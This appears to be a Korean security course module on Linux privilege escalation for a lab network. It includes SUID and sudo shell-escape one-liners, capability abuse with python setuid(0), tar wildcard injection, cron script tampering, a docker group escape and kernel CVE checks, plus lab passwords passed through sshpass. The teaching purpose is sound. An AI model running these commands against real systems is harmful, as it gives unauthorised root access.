# Week 06: 권한 상승 체인 — Linux Privesc 체인, Capabilities, SUID 체인

## 학습 목표
- Linux 권한 상승(Privilege Escalation)의 **체계적 열거 방법론**을 이해하고 적용할 수 있다
- **SUID/SGID** 바이너리를 식별하고 GTFOBins를 참조하여 권한 상승에 활용할 수 있다
- **Linux Capabilities**의 종류를 이해하고 위험한 Capability 설정을 악용할 수 있다
- **커널 익스플로잇**(Dirty Pipe, Dirty COW 등)의 원리를 이해하고 적용 조건을 판별할 수 있다
- cron, systemd, PATH 하이재킹 등 **설정 오류 기반 권한 상승**을 실행할 수 있다
- **여러 취약점을 체인으로 연결**하여 일반 사용자→root 경로를 구성할 수 있다
- MITRE ATT&CK Privilege Escalation 전술의 세부 기법을 매핑할 수 있다

## 전제 조건
- Linux 파일 시스템 권한(rwx, owner/group/other)을 이해하고 있어야 한다
- 기본 Linux 명령어(find, grep, ps, cat, chmod)를 사용할 수 있어야 한다
- 프로세스와 서비스(systemd) 개념을 이해하고 있어야 한다
- 셸 스크립트(bash) 기본 문법을 알고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 (공격 출발점) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (권한 상승 대상) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | Linux 권한 모델 + Privesc 방법론 | 강의 |
| 0:35-1:10 | SUID/SGID + GTFOBins 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | Capabilities + 커널 익스플로잇 | 실습 |
| 1:55-2:30 | 설정 오류 악용 (cron, PATH, sudo) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 권한 상승 체인 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: Linux 권한 모델과 Privesc 방법론 (35분)

## 1.1 Linux 권한 모델

```
+------------------------------------------------------------------+
|                  Linux 권한 계층                                    |
+------------------------------------------------------------------+
| root (UID 0)   | 모든 권한, 커널 수준 제어                         |
| sudo 그룹      | sudo를 통한 임시 root 권한                       |
| 서비스 계정     | www-data, postgres 등 제한된 권한                |
| 일반 사용자     | 자신의 파일과 프로세스만 접근                     |
| nobody         | 최소 권한 (서비스 격리용)                        |
+------------------------------------------------------------------+
```

### 권한 상승 벡터 분류

| 카테고리 | 기법 | 예시 | ATT&CK |
|---------|------|------|--------|
| **SUID/SGID** | 특수 권한 바이너리 악용 | find, python SUID | T1548.001 |
| **Capabilities** | 위험한 Capability 악용 | cap_setuid, cap_net_raw | T1548 |
| **sudo 오설정** | sudo 규칙 악용 | sudo vi → :!bash | T1548.003 |
| **커널 익스플로잇** | 커널 취약점 | Dirty Pipe, Dirty COW | T1068 |
| **크론잡** | 루트 크론잡 파일 변조 | 와일드카드 인젝션 | T1053.003 |
| **PATH 하이재킹** | PATH 환경변수 조작 | 악성 스크립트 우선 실행 | T1574.007 |
| **NFS** | no_root_squash 악용 | NFS SUID 복사 | T1548 |
| **Docker** | docker 그룹 악용 | 볼륨 마운트 탈출 | T1611 |
| **패스워드 파일** | /etc/shadow 읽기 | 해시 크래킹 | T1003.008 |
| **와일드카드** | tar, rsync 와일드카드 | --checkpoint-action | T1053 |

## 1.2 체계적 열거 방법론

권한 상승의 첫 단계는 **시스템 정보를 체계적으로 열거**하는 것이다.

### 열거 체크리스트

```
1. 시스템 정보
   - uname -a (커널 버전)
   - cat /etc/os-release (OS 버전)
   - arch (아키텍처)

2. 사용자/그룹
   - id (현재 사용자)
   - cat /etc/passwd (전체 사용자)
   - groups (소속 그룹)
   - sudo -l (sudo 권한)

3. SUID/SGID
   - find / -perm -4000 2>/dev/null
   - find / -perm -2000 2>/dev/null

4. Capabilities
   - getcap -r / 2>/dev/null

5. 크론잡
   - cat /etc/crontab
   - ls -la /etc/cron.d/
   - crontab -l

6. 프로세스
   - ps aux (루트 프로세스)
   - ss -tlnp (리스닝 포트)

7. 파일 권한
   - 쓰기 가능한 설정 파일
   - /etc/shadow 읽기 가능 여부

8. 네트워크
   - ip addr / ifconfig
   - 내부 서비스 (127.0.0.1)
```

## 실습 1.1: 자동화 열거 도구

> **실습 목적**: LinPEAS, linEnum 등 자동화 도구를 사용하여 권한 상승 벡터를 체계적으로 열거한다
>
> **배우는 것**: 자동화 열거 도구의 사용법과 결과 해석 방법을 배운다
>
> **결과 해석**: 빨간색/노란색으로 표시된 항목이 잠재적 권한 상승 벡터이다
>
> **실전 활용**: 모의해킹에서 초기 접근 후 가장 먼저 실행하는 도구이다
>
> **명령어 해설**: LinPEAS는 셸 스크립트로, 시스템의 모든 권한 상승 벡터를 자동으로 열거한다
>
> **트러블슈팅**: 도구가 없으면 수동 열거 명령을 순서대로 실행한다

```bash
# 수동 열거 (LinPEAS 대체)
echo "============================================================"
echo "         Linux Privilege Escalation 열거                      "
echo "============================================================"

echo ""
echo "=== 1. 시스템 정보 ==="
echo "커널: $(uname -r)"
echo "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
echo "아키텍처: $(arch)"

echo ""
echo "=== 2. 현재 사용자 ==="
id
echo "sudo 권한:"
sudo -l 2>/dev/null || echo "  sudo 사용 불가"

echo ""
echo "=== 3. SUID 바이너리 ==="
find / -perm -4000 -type f 2>/dev/null | head -20

echo ""
echo "=== 4. Capabilities ==="
getcap -r / 2>/dev/null | head -10

echo ""
echo "=== 5. 크론잡 ==="
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"
ls /etc/cron.d/ 2>/dev/null

echo ""
echo "=== 6. 루트 프로세스 ==="
ps aux 2>/dev/null | grep "^root" | grep -v "\[" | head -10

echo ""
echo "=== 7. 쓰기 가능한 디렉토리 ==="
find /etc /opt /var -writable -type d 2>/dev/null | head -10

echo ""
echo "=== 8. 내부 리스닝 포트 ==="
ss -tlnp 2>/dev/null | grep "127.0.0.1" || netstat -tlnp 2>/dev/null | grep "127.0.0.1"
```

---

# Part 2: SUID/SGID와 GTFOBins (35분)

## 2.1 SUID/SGID 원리

SUID(Set User ID) 비트가 설정된 바이너리는 **소유자의 권한**으로 실행된다. root 소유의 SUID 바이너리는 일반 사용자도 root 권한으로 실행할 수 있다.

```
-rwsr-xr-x 1 root root 12345 /usr/bin/passwd
   ^
   s = SUID 비트

일반 사용자가 실행해도 root(UID 0) 권한으로 실행됨
→ /etc/shadow 파일을 수정할 수 있음 (passwd 명령)
```

### GTFOBins 활용

GTFOBins(https://gtfobins.github.io)는 SUID, sudo, Capabilities 등으로 권한 상승에 악용할 수 있는 바이너리 목록이다.

| 바이너리 | SUID 악용 방법 | 결과 |
|---------|---------------|------|
| `find` | `find . -exec /bin/bash -p \;` | root 셸 |
| `python3` | `python3 -c 'import os; os.execl("/bin/bash","bash","-p")'` | root 셸 |
| `vim` | `vim -c ':!bash -p'` | root 셸 |
| `nmap` | `nmap --interactive; !sh` (구버전) | root 셸 |
| `cp` | `cp /bin/bash /tmp/bash; chmod +s /tmp/bash` | SUID 셸 |
| `env` | `env /bin/bash -p` | root 셸 |
| `less` | `less /etc/shadow` → `!bash -p` | root 셸 |

## 실습 2.1: SUID 바이너리 발견 및 악용

> **실습 목적**: SUID 바이너리를 발견하고 GTFOBins를 참조하여 권한 상승을 시도한다
>
> **배우는 것**: find 명령으로 SUID 바이너리를 검색하고, 각 바이너리의 악용 가능성을 판단한다
>
> **결과 해석**: id 명령의 euid가 0(root)이면 권한 상승에 성공한 것이다
>
> **실전 활용**: 초기 접근 후 SUID 검색은 권한 상승의 첫 번째 단계이다
>
> **명령어 해설**: find / -perm -4000은 SUID 비트가 설정된 모든 파일을 검색한다
>
> **트러블슈팅**: 표준 SUID 바이너리(passwd, su 등)는 악용이 어려우므로 비표준 항목에 집중한다

```bash
# SUID 바이너리 검색 및 분류
echo "=== SUID 바이너리 검색 ==="
echo ""

# 전체 SUID 목록
SUID_FILES=$(find / -perm -4000 -type f 2>/dev/null)
echo "$SUID_FILES" | sort

echo ""
echo "=== SUID 분류 ==="

# 표준 vs 비표준 분류
STANDARD="/usr/bin/passwd /usr/bin/su /usr/bin/sudo /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/mount /usr/bin/umount /usr/bin/gpasswd /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper"

echo "--- 표준 SUID (보통 안전) ---"
for f in $SUID_FILES; do
  if echo "$STANDARD" | grep -qw "$f"; then
    ls -la "$f" 2>/dev/null
  fi
done

echo ""
echo "--- 비표준 SUID (악용 가능성 검토 필요) ---"
for f in $SUID_FILES; do
  if ! echo "$STANDARD" | grep -qw "$f"; then
    ls -la "$f" 2>/dev/null
    echo "  → GTFOBins 확인: https://gtfobins.github.io/gtfobins/$(basename $f)/"
  fi
done
```

## 실습 2.2: sudo 규칙 악용

> **실습 목적**: sudo 설정의 약점을 발견하고 권한 상승에 악용한다
>
> **배우는 것**: sudo -l 출력 분석, NOPASSWD 규칙 악용, sudo 기반 셸 탈출 기법을 배운다
>
> **결과 해석**: sudo를 통해 root 셸을 획득하면 권한 상승 성공이다
>
> **실전 활용**: sudo 규칙 분석은 Linux 권한 상승에서 가장 중요한 벡터이다
>
> **명령어 해설**: sudo -l은 현재 사용자의 sudo 권한을 표시한다
>
> **트러블슈팅**: 비밀번호가 필요하면 다른 벡터를 탐색한다

```bash
# sudo 규칙 분석
echo "=== sudo -l 결과 ==="
echo 1 | sudo -S -l 2>/dev/null

echo ""
echo "=== sudo 악용 가능한 바이너리 (GTFOBins) ==="
cat << 'SUDO_ABUSE'
바이너리별 sudo 악용 방법:

sudo vi / vim:
  sudo vim -c ':!bash'

sudo less / more:
  sudo less /etc/shadow
  !bash

sudo find:
  sudo find / -exec /bin/bash \;

sudo python / python3:
  sudo python3 -c 'import os; os.system("/bin/bash")'

sudo perl:
  sudo perl -e 'exec "/bin/bash";'

sudo ruby:
  sudo ruby -e 'exec "/bin/bash"'

sudo awk:
  sudo awk 'BEGIN {system("/bin/bash")}'

sudo nmap (구버전):
  sudo nmap --interactive
  !sh

sudo env:
  sudo env /bin/bash

sudo tar:
  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

sudo zip:
  sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
SUDO_ABUSE
```

---

# Part 3: Capabilities와 커널 익스플로잇 (35분)

## 3.1 Linux Capabilities

Capabilities는 root 권한을 **세분화된 단위**로 분리한 것이다. 특정 Capability만 부여하면 전체 root 권한 없이 필요한 기능만 사용할 수 있다.

### 위험한 Capabilities

| Capability | 설명 | 악용 방법 |
|-----------|------|----------|
| **cap_setuid** | UID 변경 가능 | setuid(0)으로 root 전환 |
| **cap_setgid** | GID 변경 가능 | root 그룹 접근 |
| **cap_dac_override** | 파일 권한 무시 | 모든 파일 읽기/쓰기 |
| **cap_dac_read_search** | 읽기 권한 무시 | /etc/shadow 읽기 |
| **cap_sys_admin** | 다수 관리 기능 | mount, bpf 등 악용 |
| **cap_sys_ptrace** | 프로세스 추적 | root 프로세스 디버깅 |
| **cap_net_raw** | 원시 소켓 생성 | 패킷 캡처/스니핑 |
| **cap_net_admin** | 네트워크 설정 변경 | 라우팅 테이블 조작 |

## 실습 3.1: Capabilities 열거 및 악용

> **실습 목적**: 위험한 Capability가 설정된 바이너리를 발견하고 권한 상승에 활용한다
>
> **배우는 것**: getcap으로 Capability를 열거하고, 각 Capability의 위험성을 판단한다
>
> **결과 해석**: cap_setuid가 설정된 바이너리로 UID를 0으로 변경하면 root 권한이다
>
> **실전 활용**: Capabilities는 SUID보다 간과되기 쉬워 권한 상승의 좋은 벡터이다
>
> **명령어 해설**: getcap -r /은 전체 파일시스템에서 Capability가 설정된 파일을 검색한다
>
> **트러블슈팅**: getcap이 없으면 /sbin/getcap 또는 libcap 패키지를 확인한다

```bash
# Capabilities 열거
echo "=== Capabilities 열거 ==="
getcap -r / 2>/dev/null

echo ""
echo "=== 위험한 Capabilities 분석 ==="
getcap -r / 2>/dev/null | while read line; do
  FILE=$(echo "$line" | awk '{print $1}')
  CAPS=$(echo "$line" | awk '{$1=""; print $0}')
  RISK=""

  if echo "$CAPS" | grep -q "cap_setuid"; then
    RISK="[!!] cap_setuid → root 셸 획득 가능"
  elif echo "$CAPS" | grep -q "cap_dac_override\|cap_dac_read_search"; then
    RISK="[!!] DAC 우회 → 모든 파일 접근 가능"
  elif echo "$CAPS" | grep -q "cap_sys_admin"; then
    RISK="[!!] sys_admin → 다양한 관리 기능 악용"
  elif echo "$CAPS" | grep -q "cap_sys_ptrace"; then
    RISK="[!] sys_ptrace → 프로세스 인젝션 가능"
  elif echo "$CAPS" | grep -q "cap_net_raw"; then
    RISK="[!] net_raw → 패킷 스니핑 가능"
  fi

  if [ -n "$RISK" ]; then
    echo "  $FILE ($CAPS)"
    echo "    $RISK"
  fi
done

echo ""
echo "=== Capability 악용 예시 ==="
echo "cap_setuid가 python3에 설정된 경우:"
echo '  python3 -c "import os; os.setuid(0); os.system(\"/bin/bash\")"'
echo ""
echo "cap_dac_read_search가 설정된 경우:"
echo "  해당 바이너리로 /etc/shadow 읽기 가능"
```

## 3.2 커널 익스플로잇

### 주요 Linux 커널 익스플로잇

| CVE | 이름 | 커널 버전 | 원리 |
|-----|------|----------|------|
| CVE-2022-0847 | **Dirty Pipe** | 5.8~5.16.11 | pipe 버퍼 페이지 캐시 오염 |
| CVE-2016-5195 | **Dirty COW** | 2.6.22~4.8.3 | Copy-on-Write race condition |
| CVE-2021-4034 | **PwnKit** | polkit 0.105~0.118 | pkexec argv[0] OOB |
| CVE-2021-3156 | **Baron Samedit** | sudo 1.8.2~1.8.31p2 | sudo 힙 버퍼 오버플로 |
| CVE-2022-2588 | **DirtyCred** | 5.8~5.19 | 크레덴셜 교체 |
| CVE-2023-0386 | **OverlayFS** | 5.11~6.2 | setuid 복사 |

## 실습 3.2: 커널 버전 확인 및 익스플로잇 검색

> **실습 목적**: 현재 커널 버전에 적용 가능한 권한 상승 익스플로잇을 검색한다
>
> **배우는 것**: 커널 버전 기반 익스플로잇 검색과 적용 가능성 판단 기법을 배운다
>
> **결과 해석**: 커널 버전이 취약 범위에 포함되면 해당 익스플로잇이 적용 가능하다
>
> **실전 활용**: 다른 모든 벡터가 실패할 때 마지막 수단으로 커널 익스플로잇을 시도한다
>
> **명령어 해설**: uname -r로 커널 버전을 확인하고, searchsploit으로 익스플로잇을 검색한다
>
> **트러블슈팅**: 커널 익스플로잇은 시스템 크래시 위험이 있으므로 프로덕션에서 주의한다

```bash
# 커널 버전 확인
echo "=== 커널 정보 ==="
echo "커널 버전: $(uname -r)"
echo "커널 전체: $(uname -a)"

echo ""
echo "=== 주요 CVE 적용 가능성 ==="
KERNEL=$(uname -r | cut -d'.' -f1,2)
KERNEL_FULL=$(uname -r)

python3 << PYEOF
import re

kernel = "$KERNEL_FULL"
major = int(kernel.split('.')[0])
minor = int(kernel.split('.')[1])

vulns = [
    ("CVE-2022-0847 (Dirty Pipe)", 5, 8, 5, 16, "pipe 버퍼 오염 → 파일 덮어쓰기"),
    ("CVE-2016-5195 (Dirty COW)", 2, 6, 4, 8, "COW race condition"),
    ("CVE-2021-4034 (PwnKit)", 0, 0, 99, 99, "polkit pkexec (커널 무관, polkit 버전 확인)"),
    ("CVE-2021-3156 (Baron Samedit)", 0, 0, 99, 99, "sudo 버전 확인 필요"),
    ("CVE-2022-2588 (DirtyCred)", 5, 8, 5, 19, "크레덴셜 교체"),
    ("CVE-2023-0386 (OverlayFS)", 5, 11, 6, 2, "setuid 복사"),
]

print(f"현재 커널: {kernel} (major={major}, minor={minor})")
print()

for name, min_maj, min_min, max_maj, max_min, desc in vulns:
    if min_maj == 0 and max_maj == 99:
        status = "[?] 별도 확인 필요"
    elif (major > min_maj or (major == min_maj and minor >= min_min)) and \
         (major < max_maj or (major == max_maj and minor <= max_min)):
        status = "[!!] 잠재적 취약"
    else:
        status = "[OK] 영향 없음"
    print(f"  {status} {name}")
    print(f"    범위: {min_maj}.{min_min}~{max_maj}.{max_min}, 원리: {desc}")
    print()
PYEOF

# polkit 버전 확인 (PwnKit)
echo "=== polkit 버전 ==="
pkexec --version 2>/dev/null || echo "pkexec 없음"

# sudo 버전 확인 (Baron Samedit)
echo "=== sudo 버전 ==="
sudo --version 2>/dev/null | head -1
```

---

# Part 4: 설정 오류 악용과 권한 상승 체인 (35분)

## 4.1 크론잡 악용

root 크론잡이 **일반 사용자가 수정할 수 있는 스크립트를 실행**하면 권한 상승이 가능하다.

### 크론잡 악용 시나리오

```
[취약한 설정]
# /etc/crontab
* * * * * root /opt/scripts/backup.sh

# /opt/scripts/backup.sh 가 일반 사용자에게 쓰기 가능
-rwxrwxrwx 1 root root 100 /opt/scripts/backup.sh

[공격]
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# 1분 후 root가 실행 → /tmp/rootbash에 SUID 설정됨
/tmp/rootbash -p  # root 셸!
```

### 와일드카드 인젝션

```bash
# 취약한 크론잡: tar에 와일드카드 사용
* * * * * root cd /opt/backup && tar czf /tmp/backup.tar.gz *

# 공격: 파일명을 tar 옵션으로 생성
echo "" > /opt/backup/"--checkpoint=1"
echo "" > /opt/backup/"--checkpoint-action=exec=sh privesc.sh"
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /opt/backup/privesc.sh
# tar가 * 확장 시 파일명이 옵션으로 해석됨!
```

## 실습 4.1: 크론잡과 PATH 하이재킹

> **실습 목적**: 크론잡 악용과 PATH 하이재킹으로 권한 상승을 실습한다
>
> **배우는 것**: 크론잡 분석, 쓰기 가능 스크립트 발견, PATH 우선순위 조작 기법을 배운다
>
> **결과 해석**: root 크론잡이 악성 스크립트를 실행하면 권한 상승 성공이다
>
> **실전 활용**: 크론잡은 간과되기 쉬운 권한 상승 벡터로, 항상 열거해야 한다
>
> **명령어 해설**: /etc/crontab과 /etc/cron.d/를 분석하고 쓰기 가능 여부를 확인한다
>
> **트러블슈팅**: 크론 서비스가 실행 중인지 systemctl status cron으로 확인한다

```bash
# 크론잡 분석
echo "=== 크론잡 열거 ==="
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null

echo ""
echo "--- /etc/cron.d/ ---"
ls -la /etc/cron.d/ 2>/dev/null
for f in /etc/cron.d/*; do
  echo "  [$f]"
  cat "$f" 2>/dev/null | grep -v "^#" | grep -v "^$"
done

echo ""
echo "--- 사용자 크론잡 ---"
crontab -l 2>/dev/null || echo "현재 사용자 크론잡 없음"

echo ""
echo "=== 쓰기 가능한 크론 스크립트 검색 ==="
# 크론잡에서 참조하는 스크립트 파일의 쓰기 권한 확인
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | awk '{print $NF}' | while read script; do
  if [ -f "$script" ] && [ -w "$script" ]; then
    echo "  [!!] 쓰기 가능: $script"
    ls -la "$script"
  fi
done

echo ""
echo "=== PATH 하이재킹 분석 ==="
echo "--- 크론잡 PATH ---"
grep "^PATH" /etc/crontab 2>/dev/null
echo ""
echo "--- PATH에서 쓰기 가능한 디렉토리 ---"
IFS=':' read -ra PATHS <<< "$PATH"
for p in "${PATHS[@]}"; do
  if [ -w "$p" ]; then
    echo "  [!!] 쓰기 가능: $p"
  fi
done
```

## 실습 4.2: 권한 상승 체인 — 종합 시나리오

> **실습 목적**: 여러 권한 상승 벡터를 체인으로 연결하여 일반 사용자→root 경로를 구성한다
>
> **배우는 것**: 단일 벡터가 부족할 때 여러 벡터를 조합하는 권한 상승 체인 구성법을 배운다
>
> **결과 해석**: 최종적으로 root 셸(euid=0)을 획득하면 체인이 성공한 것이다
>
> **실전 활용**: 실제 모의해킹에서 단일 벡터로는 불가능한 권한 상승을 체인으로 달성한다
>
> **명령어 해설**: 각 단계의 결과가 다음 단계의 입력이 되는 체인 구조이다
>
> **트러블슈팅**: 체인의 특정 단계가 실패하면 대안 벡터를 탐색한다

```bash
echo "============================================================"
echo "       권한 상승 체인 종합 시나리오                            "
echo "============================================================"

echo ""
echo "[Phase 1] 현재 상태 확인"
echo "  사용자: $(whoami)"
echo "  UID: $(id -u)"
echo "  그룹: $(groups)"

echo ""
echo "[Phase 2] 모든 벡터 열거"
echo "--- SUID ---"
SUID_COUNT=$(find / -perm -4000 -type f 2>/dev/null | wc -l)
echo "  SUID 바이너리: ${SUID_COUNT}개"

echo "--- Capabilities ---"
CAP_COUNT=$(getcap -r / 2>/dev/null | wc -l)
echo "  Capability 바이너리: ${CAP_COUNT}개"

echo "--- sudo ---"
echo 1 | sudo -S -l 2>/dev/null | grep -c "NOPASSWD\|ALL" || echo "  0"
echo "  위 개수의 sudo 규칙 발견"

echo "--- 크론잡 ---"
CRON_COUNT=$(cat /etc/crontab 2>/dev/null | grep -cv "^#\|^$\|^PATH\|^SHELL\|^MAILTO")
echo "  크론잡: ${CRON_COUNT}개"

echo "--- 커널 ---"
echo "  커널: $(uname -r)"

echo ""
echo "[Phase 3] 권한 상승 체인 구성"
cat << 'CHAIN'
가능한 체인 시나리오:

체인 A: SUID → root 셸
  1. find / -perm -4000 → 비표준 SUID 발견 (예: python3)
  2. python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
  3. root 셸 획득

체인 B: sudo → SUID 생성 → root 셸
  1. sudo -l → sudo find 사용 가능
  2. sudo find / -exec cp /bin/bash /tmp/rootbash \;
  3. sudo find / -exec chmod +s /tmp/rootbash \;
  4. /tmp/rootbash -p → root 셸

체인 C: 쓰기 가능 파일 → 크론잡 → root
  1. 크론잡 분석 → /opt/scripts/backup.sh 쓰기 가능
  2. 리버스 셸 삽입
  3. 크론 실행 대기 → root 셸

체인 D: Capability → 파일 읽기 → 패스워드 → su
  1. cap_dac_read_search 발견 → /etc/shadow 읽기
  2. 해시 크래킹 → root 비밀번호
  3. su root → root 셸

체인 E: 커널 익스플로잇
  1. uname -r → 취약 커널 버전
  2. 해당 CVE 익스플로잇 컴파일
  3. 실행 → root 셸
CHAIN

echo ""
echo "[Phase 4] 실제 시도"
# sudo를 이용한 권한 상승 시도
echo "--- sudo를 통한 root 접근 ---"
echo 1 | sudo -S id 2>/dev/null && echo "[+] sudo로 root 접근 성공" || echo "[-] sudo 실패"

echo ""
echo "============================================================"
echo "  각 서버에서 다른 체인이 가능할 수 있음 - 모두 시도하라       "
echo "============================================================"
```

## 실습 4.3: 원격 서버 권한 상승 열거

> **실습 목적**: 실습 환경의 각 서버에서 권한 상승 벡터를 원격으로 열거한다
>
> **배우는 것**: SSH를 통한 원격 시스템의 권한 상승 벡터 열거 기법을 배운다
>
> **결과 해석**: 각 서버별로 발견된 벡터를 비교하여 가장 효과적인 경로를 선택한다
>
> **실전 활용**: 내부 피봇 후 새로운 호스트에서의 권한 상승 열거에 활용한다
>
> **명령어 해설**: SSH로 원격 서버에 열거 명령을 전달한다
>
> **트러블슈팅**: SSH 접근이 안 되면 다른 접근 경로(웹셸 등)를 활용한다

```bash
# 각 서버 원격 열거
for SERVER in "web@10.20.30.80" "secu@10.20.30.1" "siem@10.20.30.100"; do
  NAME=$(echo "$SERVER" | cut -d'@' -f1)
  IP=$(echo "$SERVER" | cut -d'@' -f2)

  echo "============================================"
  echo "  서버: $NAME ($IP)"
  echo "============================================"

  sshpass -p1 ssh -o StrictHostKeyChecking=no "$SERVER" "
    echo '--- 사용자 ---'
    id
    echo '--- SUID (비표준) ---'
    find /usr/local -perm -4000 -type f 2>/dev/null
    find /opt -perm -4000 -type f 2>/dev/null
    find /home -perm -4000 -type f 2>/dev/null
    echo '--- Capabilities ---'
    getcap -r /usr 2>/dev/null
    echo '--- sudo ---'
    echo 1 | sudo -S -l 2>/dev/null | tail -5
    echo '--- 커널 ---'
    uname -r
  " 2>/dev/null || echo "  접속 실패"
  echo ""
done
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | SUID 열거 | find -perm -4000 | 전체 목록 출력 |
| 2 | GTFOBins 활용 | 바이너리 악용 | 셸 탈출 방법 제시 |
| 3 | sudo 분석 | sudo -l | 악용 가능 규칙 식별 |
| 4 | Capabilities 열거 | getcap -r / | 위험 Capability 식별 |
| 5 | 커널 버전 확인 | uname -r | 취약 여부 판단 |
| 6 | 크론잡 분석 | /etc/crontab | 쓰기 가능 스크립트 |
| 7 | PATH 하이재킹 | PATH 분석 | 쓰기 가능 디렉토리 |
| 8 | 와일드카드 인젝션 | tar 악용 | 원리 설명 |
| 9 | 원격 열거 | SSH 명령 | 3개 서버 열거 |
| 10 | 체인 구성 | 종합 시나리오 | 최소 3개 체인 설계 |

---

## 자가 점검 퀴즈

**Q1.** SUID 비트가 설정된 바이너리가 위험한 이유는?

<details><summary>정답</summary>
SUID 바이너리는 실행 시 파일 소유자의 권한으로 동작한다. root 소유의 SUID 바이너리는 일반 사용자가 실행해도 root 권한을 가지므로, 셸 탈출이나 파일 접근이 가능하면 권한 상승에 직결된다.
</details>

**Q2.** GTFOBins에서 find 바이너리의 SUID 악용 명령어는?

<details><summary>정답</summary>
`find . -exec /bin/bash -p \;` — find가 SUID root로 실행되므로, -exec로 시작되는 bash도 root 권한(euid=0)을 유지한다. -p 옵션은 bash가 euid를 드롭하지 않도록 한다.
</details>

**Q3.** Linux Capabilities에서 cap_setuid가 python3에 설정되어 있으면 어떻게 악용하는가?

<details><summary>정답</summary>
`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` — cap_setuid는 프로세스의 UID를 변경할 수 있는 권한이므로, os.setuid(0)으로 UID를 root(0)로 변경한 후 셸을 실행하면 root 셸을 얻는다.
</details>

**Q4.** Dirty Pipe(CVE-2022-0847)의 공격 원리를 간단히 설명하라.

<details><summary>정답</summary>
Linux 커널의 pipe 버퍼가 페이지 캐시의 데이터를 참조할 때, PIPE_BUF_FLAG_CAN_MERGE 플래그가 부적절하게 설정되어 읽기 전용 파일의 페이지 캐시를 덮어쓸 수 있다. 이를 통해 /etc/passwd의 root 비밀번호를 변경하거나, SUID 바이너리를 수정하여 권한 상승이 가능하다.
</details>

**Q5.** 크론잡의 와일드카드 인젝션이 동작하는 원리는?

<details><summary>정답</summary>
셸에서 *는 현재 디렉토리의 파일명으로 확장된다. 파일명이 --option 형태이면 tar 등의 명령어가 이를 파일명이 아닌 옵션으로 해석한다. 예: --checkpoint-action=exec=shell.sh 라는 이름의 파일을 생성하면, tar가 이를 옵션으로 인식하여 shell.sh를 실행한다.
</details>

**Q6.** PATH 하이재킹의 원리와 전제 조건은?

<details><summary>정답</summary>
크론잡이나 스크립트가 명령을 절대경로 없이 실행하면(예: python3 대신 /usr/bin/python3), PATH 환경변수의 순서에 따라 먼저 발견되는 바이너리가 실행된다. 전제: PATH에 공격자가 쓰기 가능한 디렉토리가 포함되어 있고, 그 디렉토리가 정상 바이너리 위치보다 앞에 있어야 한다.
</details>

**Q7.** docker 그룹에 속한 사용자가 root 권한을 얻는 방법은?

<details><summary>정답</summary>
`docker run -v /:/mnt --rm -it alpine chroot /mnt bash` — 호스트의 / 를 컨테이너에 마운트하고 chroot하면 호스트 파일시스템에 root 권한으로 접근할 수 있다. docker 데몬은 root로 실행되므로 컨테이너 내부는 root이다.
</details>

**Q8.** LinPEAS의 출력에서 빨간색으로 표시되는 항목의 의미는?

<details><summary>정답</summary>
빨간색(RED/YELLOW)은 높은 확률로 권한 상승에 활용할 수 있는 벡터를 의미한다. 예: 비표준 SUID 바이너리, 위험한 Capability, NOPASSWD sudo 규칙, 쓰기 가능한 root 크론 스크립트 등. 빨간색 항목을 우선 분석해야 한다.
</details>

**Q9.** NFS no_root_squash 설정이 위험한 이유는?

<details><summary>정답</summary>
no_root_squash가 설정되면 NFS 클라이언트의 root 사용자가 NFS 공유에서 root 권한을 유지한다. 공격자가 자신의 머신에서 SUID 바이너리를 NFS 공유에 복사하면, 타겟 서버에서 해당 바이너리를 SUID root로 실행할 수 있다.
</details>

**Q10.** 실습 환경(10.20.30.0/24)에서 권한 상승 체인을 구성하라.

<details><summary>정답</summary>
1. web 서버: Juice Shop SQLi → 웹셸 획득 (www-data) → SUID/sudo 열거 → sudo를 이용한 root 상승
2. opsclaw: SSH 접근 (opsclaw 사용자) → sudo(비밀번호: 1) → root
3. secu: SSH 접근 (secu 사용자) → SUID/Capability 열거 → 커널 익스플로잇 또는 sudo
4. 체인: web(www-data) → 로컬 privesc → SSH 피봇 → secu/siem 접근 → 추가 privesc
</details>

---

## 과제

### 과제 1: Privesc 자동화 스크립트 (개인)
LinPEAS의 주요 검사 항목(SUID, Capabilities, sudo, 크론잡, PATH)을 구현하는 간이 셸 스크립트를 작성하라. 각 항목의 위험도를 색상이나 기호로 표시할 것.

### 과제 2: 서버별 Privesc 보고서 (팀)
실습 환경의 4개 서버(opsclaw, secu, web, siem)에서 각각 권한 상승 열거를 수행하고, 서버별 발견된 벡터와 추천 공격 경로를 정리한 보고서를 작성하라.

### 과제 3: 권한 상승 방어 가이드 (팀)
이번 주 학습한 모든 권한 상승 벡터에 대한 방어 가이드를 작성하라. SUID 최소화, Capability 감사, sudo 강화, 크론잡 보안 등을 포함할 것.
